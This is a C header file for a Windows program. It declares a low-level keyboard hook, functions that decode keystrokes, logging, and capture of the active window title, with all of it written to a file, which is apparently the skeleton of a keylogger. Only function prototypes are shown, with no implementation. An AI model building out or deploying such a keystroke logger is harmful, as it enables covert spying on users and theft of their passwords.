#ifndef _HEADER_H
# define _HEADER_H

# include <Windows.h>
# include <Stdio.h>
# include <fcntl.h>

# include "structs.h"

void	StartKeyBoardHook();
LRESULT	__stdcall HookProcedure(int nCode, WPARAM wParam, LPARAM lParam);
void	ReleaseHook();

void	init_kb_status(int key_value);
short	key_zone(int key_value);
short	analyse_keyboard_status(int key_value);

void	edit_log(short character);
void	window_title(void);

bool	put_file(char *str);
bool	put_window_file(HWND window);

#endif // _HEADER_H